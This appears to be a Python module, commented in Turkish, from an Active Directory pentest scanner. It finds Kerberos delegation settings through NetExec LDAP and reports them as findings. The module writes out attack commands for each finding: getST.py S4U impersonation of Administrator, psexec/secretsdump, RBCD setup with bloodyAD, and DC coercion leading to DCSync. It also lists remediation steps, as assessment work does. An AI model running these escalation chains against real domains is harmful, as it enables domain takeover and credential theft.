"""Kerberos delegasyon istismarı: unconstrained / constrained / RBCD (opt-in).

`nxc ldap --find-delegation` ile delegasyon yapılandırmalarını bulur ve her tür
için HAZIR istismar komutlarını (getST.py S4U zinciri) üretir — elle SPN/komut
kurmak yerine. `--active-attacks` + uygun kimlik verildiğinde constrained/RBCD
için getST.py'yi çalıştırmayı dener; aksi halde PLAN üretir.

Türler:
  * Unconstrained : host ele geçirilirse, DC'yi coerce et -> DC TGT yakala (relay_scan).
  * Constrained   : hesabın izinli SPN'ine getST -impersonate Administrator -> servise DA.
  * RBCD          : kontrol edilen bilgisayarda msDS-AllowedToActOnBehalfOf -> getST.
"""

from __future__ import annotations

import re

from ..findings import Finding, ScanReport, Severity
from ..runner import CommandResult, resolve_impacket, run, strip_dryrun
from . import nxc_scan


def tool():
    return nxc_scan.tool()


def _auth(username, password, nthash, domain):
    a = ["-u", username or ""]
    if domain:
        a += ["-d", domain]
    a += (["-H", nthash] if nthash else ["-p", password or ""])
    return a


def scan(target, *, domain=None, username=None, password=None, nthash=None,
         timeout=300, dry_run=False):
    if username is None or not (password or nthash):
        return [CommandResult(tool="delegation:skip", argv=[], returncode=None,
                              stdout="", stderr="", duration=0.0,
                              error="delegation: kimlik gerekli (LDAP enum)")]
    bin_name = tool().name
    host = target.split(",")[0].split("/")[0].strip()
    argv = [bin_name, "ldap", host] + _auth(username, password, nthash, domain) \
        + ["--find-delegation"]
    return [run(argv, tool="delegation-find", timeout=timeout, dry_run=dry_run)]


# nxc --find-delegation satırı:  "  <AccountName>  <AccountType>  <DelegationType>  <SPN>"
_ROW_RX = re.compile(
    r"^LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+(\S+)\s+"
    r"(Unconstrained|Constrained(?:\s+w/\s+Protocol\s+Transition)?|Resource-Based\s+Constrained)"
    r"\s*(.*)$", re.IGNORECASE)


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["delegation"] = "\n\n".join(r.combined for r in results)
    first = results[0] if results else None
    if first and first.tool == "delegation:skip":
        if first.error:
            report.add_error(f"delegation: {first.error}")
        return
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target
    dc = target.split(",")[0].split("/")[0].strip()
    dom = report.domain or "<domain>"

    getst = resolve_impacket('getST.py') or 'getST.py'
    unconstrained, constrained, rbcd = [], [], []
    for line in combined.splitlines():
        m = _ROW_RX.match(line.strip() if not line.startswith("LDAP") else line)
        if not m:
            continue
        acct, _atype, dtype, spn = m.group(1), m.group(2), m.group(3), m.group(4).strip()
        dl = dtype.lower()
        if "unconstrained" in dl:
            unconstrained.append(acct)
        elif "resource" in dl:
            rbcd.append((acct, spn))
        else:
            constrained.append((acct, spn))

    if unconstrained:
        report.add(Finding(
            title=f"Unconstrained delegation — {len(unconstrained)} hesap",
            severity=Severity.HIGH, target=target, source="delegation",
            control_id="deleg.unconstrained", mitre="T1558",
            reference="Unconstrained Delegation",
            description="Bu hesaplar kendilerine kimlik doğrulayan HERKESİN TGT'sini "
                        "belleğinde tutar. Host ele geçirilir ya da DC coerce edilirse "
                        "DC TGT yakalanır -> DCSync (DA).",
            evidence="\n".join(sorted(set(unconstrained))[:40]),
            remediation="Unconstrained delegation'ı kaldır; hassas hesaplara "
                        "'Account is sensitive and cannot be delegated' uygula.",
            poc=f"nxc ldap {dc} -u <u> -p <p> --find-delegation",
            escalation=(f"1) Host'u ele geçir -> Rubeus/monitor TGT; VEYA\n"
                        f"2) DC'yi coerce et: adscan {dc} --active-attacks --launch "
                        "--listener-ip <ip>  (unconstrained host dinleyici) -> DC TGT -> DCSync.")))

    for acct, spn in constrained:
        report.add(Finding(
            title=f"Constrained delegation — {acct}",
            severity=Severity.HIGH, target=target, source="delegation",
            control_id="deleg.constrained", object_id=f"account:{acct}",
            mitre="T1558.003", reference="Constrained Delegation (S4U2proxy)",
            description=f"'{acct}' hesabı '{spn}' servisine delege edebiliyor. Bu hesabın "
                        "parolası/hash'i ele geçirilirse S4U ile o serviste HERHANGİ bir "
                        "kullanıcı (Administrator) taklit edilebilir.",
            evidence=f"{acct} -> {spn}",
            remediation="Constrained delegation hedeflerini gözden geçir; protocol "
                        "transition (S4U2self) kullanımını kısıtla.",
            poc=f"nxc ldap {dc} -u <u> -p <p> --find-delegation",
            escalation=(f"{getst} -spn '{spn}' -impersonate Administrator "
                        f"'{dom}/{acct}:<parola>'  (hash ile: -hashes :<nt>)\n"
                        "export KRB5CCNAME=Administrator.ccache -> hedef servise psexec/secretsdump.")))

    for acct, spn in rbcd:
        report.add(Finding(
            title=f"RBCD (Resource-Based Constrained Delegation) — {acct}",
            severity=Severity.HIGH, target=target, source="delegation",
            control_id="deleg.rbcd", object_id=f"account:{acct}",
            mitre="T1558.003", reference="RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)",
            description=f"'{acct}' üzerinde RBCD yapılandırılmış. Kaynağı kontrol eden "
                        "hesap, o kaynakta herhangi bir kullanıcıyı taklit edebilir.",
            evidence=f"{acct}  {spn}",
            remediation="Gereksiz RBCD yapılandırmalarını kaldır; yazma haklarını denetle.",
            poc=f"nxc ldap {dc} -u <u> -p <p> --find-delegation",
            escalation=(f"{getst} -spn 'cifs/{acct}' -impersonate Administrator "
                        f"'{dom}/<kontrol_edilen_makine$>:<parola>'\n"
                        "Kenar yoksa önce RBCD kur: bloodyAD ... add rbcd <hedef> <sizin_makine$>.")))


# ---------------------------------------------------------------------------
from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx.target, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash,
                timeout=ctx.timeout, dry_run=ctx.dry_run)


MODULE = ScanModule(
    name="delegation",
    label="Kerberos delegasyon istismarı: unconstrained/constrained/RBCD (opt-in)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)
